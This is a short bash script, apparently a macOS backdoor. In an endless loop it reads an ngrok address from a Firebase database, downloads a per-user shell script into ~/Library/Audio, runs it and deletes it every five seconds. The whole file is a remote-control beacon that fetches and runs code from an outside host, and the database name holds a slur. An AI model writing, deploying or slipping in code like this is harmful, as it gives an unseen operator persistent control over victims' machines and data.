#!/bin/bash

GetAndExec() {
    # Collect ngrok url from firebase
    response=$(curl -s "https://retard-e363c-default-rtdb.asia-southeast1.firebasedatabase.app/IP.json")
    NGROK="${response:1:${#response}-2}"

    EXEC="$NGROK/$USER"

    # Download exec from ngrok url
    curl -so "~/Library/Audio/$USER.sh" "$EXEC"

    # Execute exec
    sh "~/Library/Audio/$USER.sh"

    rm "~/Library/Audio/$USER.sh"
}

while true; do
    GetAndExec
    sleep 5
done
